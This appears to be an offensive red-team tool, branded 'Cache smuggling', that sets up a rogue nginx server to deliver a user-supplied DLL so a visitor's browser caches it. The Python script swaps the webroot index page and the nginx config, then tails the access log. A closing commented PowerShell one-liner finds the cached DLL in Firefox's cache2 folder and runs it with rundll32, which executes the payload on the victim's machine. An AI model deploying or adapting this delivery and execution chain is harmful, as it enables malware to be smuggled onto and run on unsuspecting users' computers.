import os
import re
import subprocess
import shutil
import signal
import sys
import argparse
from termcolor import colored, cprint

def start_nginx_service_safely():
    # Check if the script is being run as a superuser (root)
    if os.geteuid() != 0:
        cprint("[*] You need to run this script with superuser privileges (e.g., using 'sudo').","yellow")
        return

    # Check if the 'service' command exists
    if not shutil.which('service'):
        cprint("[-] The 'service' command is not available on your system. Make sure you have it installed.","red")
        return

    try:
        # Run the command using subprocess & create Acess log file
        subprocess.run(["touch","/tmp/access.log"], check=True)
        subprocess.run(["service", "nginx", "start"], check=True)
        cprint("[+] Nginx service started successfully.","green")
    except subprocess.CalledProcessError as e:
        cprint(f"[-] Error starting Nginx service: {e}", "red")
    except Exception as e:
        cprint(f"An error occurred: {e}","red")


def modify_Serverfile(file_path,replacement_dll):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            # Define a regular expression pattern to match content starting with / and ending with .dll
            pattern = r'/[^/]+\.dll'
            replacement_dll="/"+replacement_dll
            # Replace the matched content with the replacement keyword
            new_content = re.sub(pattern, replacement_dll, content)
        with open(file_path, 'w') as file:
            file.write(new_content)
    except FileNotFoundError:
        cprint(f"[-] DLL File not found: {file_path}","red")
    except Exception as e:
        cprint(f"[-] An error occurred: {str(e)}","red")



def deployment(dll_path):
    # updating webroot directory
    dll_file_name=os.path.basename(dll_path)
    clean_up(dll_file_name)
    shutil.copy(dll_path,"/var/www/html")
    modify_Serverfile("./webserver/index.html",dll_file_name)
    os.rename("/var/www/html/index.html","/var/www/html/index.html.bak")
    shutil.copy("./webserver/index.html","/var/www/html/index.html")
    #changing the nginx config
    modify_Serverfile("./webserver/nginx.conf",dll_file_name)
    os.rename("/etc/nginx/sites-available/default","/etc/nginx/sites-available/default.bak")
    shutil.copy("./webserver/nginx.conf","/etc/nginx/sites-available/default")
    start_nginx_service_safely()
    cprint("[+] Rogue Server started at port 81","green")
    try:
        while True:
            cprint("[+] Serving the logs....","green")
            cprint("[*] Press CTRL+C to stop the server")
            subprocess.run(["tail","-f","/tmp/access.log"],check=True)
    except KeyboardInterrupt:
            cprint("[+] CTRL+c Detected, Stopping nginx service ....","yellow")
            subprocess.run(["service", "nginx", "stop"], check=True)
            cprint("[+] Nginx Stopped Sucessfully","green")
            clean_up(dll_file_name)
    except EOFError:
            cprint("[-] Error in Starting Nginx\n-check your installation\n-stop nginx manually","red")
            clean_up(dll_file_name) 

def clean_up(dll_file_name):
    try:
        os.remove(f"/var/www/html/{dll_file_name}")
        os.remove(f"/tmp/access.log")
        if os.path.exists("/etc/nginx/sites-available/default.bak"):
            #clean up of nginx config files
            cprint("[+] Cleaning up the artifacts...","green",end="")
            os.remove("/etc/nginx/sites-available/default")
            os.rename("/etc/nginx/sites-available/default.bak","/etc/nginx/sites-available/default")
        if os.path.exists("/var/www/html/index.html.bak"):
            cprint("...","green")
            #clean up of webroot directory
            os.remove("/var/www/html/index.html")
            os.rename("/var/www/html/index.html.bak","/var/www/html/index.html")
        else:
            pass
    except:
        pass

def process_arguments():
    parser = argparse.ArgumentParser(description='My Python Program')

    # Define command-line arguments
    parser.add_argument('--dll', '-d', required=True, help='Dll Input file path')

    # Parse the arguments
    args = parser.parse_args()

    # Access the parsed arguments
    input_file = args.dll

    return input_file

if __name__ == '__main__':
    banner='''
╔═╗┌─┐┌─┐┬ ┬┌─┐  ┌─┐┌┬┐┬ ┬┌─┐┌─┐┬  ┬┌┐┌┌─┐
║  ├─┤│  ├─┤├┤   └─┐││││ ││ ┬│ ┬│  │││││ ┬
╚═╝┴ ┴└─┘┴ ┴└─┘  └─┘┴ ┴└─┘└─┘└─┘┴─┘┴┘└┘└─┘
                                @suryadevsingh
                                @kryolite_secure
'''
    print(banner)
    input_file = process_arguments()
    if input_file:
        deployment(input_file)
# Firefox

#foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")) {Get-ChildItem $files -Recurse | ForEach-Object {if (Select-String -Pattern "ENTRYPOINT" -Path $_.FullName) {$dllPath = $_.FullName + '.'; rundll32.exe $dllPath,MainDll}}}
